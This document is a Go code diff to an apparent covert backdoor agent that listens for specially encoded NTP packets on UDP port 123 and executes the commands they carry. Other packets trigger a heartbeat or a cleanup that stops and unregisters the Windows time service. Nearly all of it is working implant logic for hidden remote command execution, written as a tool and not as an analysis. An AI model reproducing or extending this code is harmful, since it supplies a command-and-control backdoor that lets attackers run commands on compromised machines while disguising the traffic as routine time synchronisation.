@@ -22,9 +22,7 @@ func StartSniffer(newAgent agent.Agent) {
 		var (
 			iface  = newAgent.IFace
 			buffer = int32(1600)
-			filter = "udp and port 123 and dst " + net.IP(newAgent.MyIP).String() //note for myself: listening for any NTP traffic, magic string search
-			//when i send ping (from server) for the first time, it should take note of my IP and call setup. store that for beacons
-			//if i ping again from a different IP, calls setup again with the new IP. fixes the ntp.fun dns issue
+			filter = "udp and port 123 and dst " + net.IP(newAgent.MyIP).String()
 		)
 
 		handler, err := pcap.OpenLive(iface, buffer, false, pcap.BlockForever)
@@ -40,7 +38,7 @@ func StartSniffer(newAgent agent.Agent) {
 
 		source := gopacket.NewPacketSource(handler, handler.LinkType())
 		for packet := range source.Packets() {
-			ret, cont := harvestInfo(packet)
+			ret, cont := harvestInfo(packet, newAgent)
 			if strings.Contains(cont, "COM") {
 				msg += ret
 			}
@@ -49,20 +47,16 @@ func StartSniffer(newAgent agent.Agent) {
 				runCommand(msg, newAgent)
 				msg = ""
 			} else if cont == "KILL" {
-				//TODO add start shutdown. run commands whatever (for windows net stop w32time, linux??)
+				if newAgent.OpSys == "Windows" {
+					runCommand("net stop w32time", newAgent)
+					runCommand("w32tm /unregister", newAgent)
+				} else {
+					//runCommand()
+					fmt.Println("run kill command fix this") //TODO add linux commands cleanup
+				}
 				return
 			} else if cont == "PING" { //resync
-				fmt.Println(string(newAgent.ServerIP))
-				fmt.Println(ret)
-				if ret != string(newAgent.ServerIP) { //solves DHCP issue
-					newAgent.ServerIP = []byte(ret) //TODO on normal?
-					agent.Setup(newAgent)
-				} else {
-					Heartbeat(newAgent)
-				}
-
-				fmt.Println("ping. serverip: ", newAgent.ServerIP)
-
+				Heartbeat(newAgent)
 			} else {
 				continue
 			}
@@ -71,11 +65,17 @@ func StartSniffer(newAgent agent.Agent) {
 
 }
 
-func harvestInfo(packet gopacket.Packet) (string, string) {
+func harvestInfo(packet gopacket.Packet, newAgent agent.Agent) (string, string) {
 	ipLayer := packet.NetworkLayer()
 	ipLayerBytes := ipLayer.LayerContents()
 	srcIP := ipLayer.LayerContents()[len(ipLayerBytes)-8 : len(ipLayerBytes)-4]
 	app := packet.ApplicationLayer()
+
+	if bytes.Compare(srcIP, newAgent.ServerIP) != 0 { //solves DHCP issue
+		newAgent.ServerIP = srcIP
+		agent.Setup(newAgent)
+	}
+
 	if app != nil {
 		final := decode(app.LayerContents())
 		index := strings.Index(final, "COM")
@@ -86,7 +86,7 @@ func harvestInfo(packet gopacket.Packet) (string, string) {
 		} else if strings.Contains(final, "KILL") {
 			return "", "KILL"
 		} else if strings.Contains(final, "PING") {
-			return string(srcIP), "PING" //TODO server auto pings agent if goes to MIA, hoping for change response. also updates NTP server information on box
+			return "", "PING" //TODO server auto pings agent if goes to MIA, hoping for change response. also updates NTP server information on box
 		}
 	}
 	return "ignore", "ignore"
@@ -122,7 +122,7 @@ func Heartbeat(newAgent agent.Agent) {
 	if newAgent.OpSys == "Windows" {
 		runCommand("w32tm /resync", newAgent)
 	} else {
-		runCommand("echo yeah ill add this funct eventually", newAgent) //TODO actual linux command
+		runCommand("sntp -s "+net.IP(newAgent.ServerIP).String(), newAgent) //TODO actual linux command
 	}
 }
 
@@ -138,7 +138,3 @@ func encode(output []byte, handler *pcap.Handle, newAgent agent.Agent) {
 		gopacket.Payload([]byte{1, 2, 3, 4}))
 	packetData := buf.Bytes()
 }*/
-
-//More notes for myself
-//server will run on two main threads: listening for connections (always) -> action thread. And prompt.
-//client will run on two main threads: sniffing traffic (always) and then responding to said traffic. maybe split the second part up into more strings too
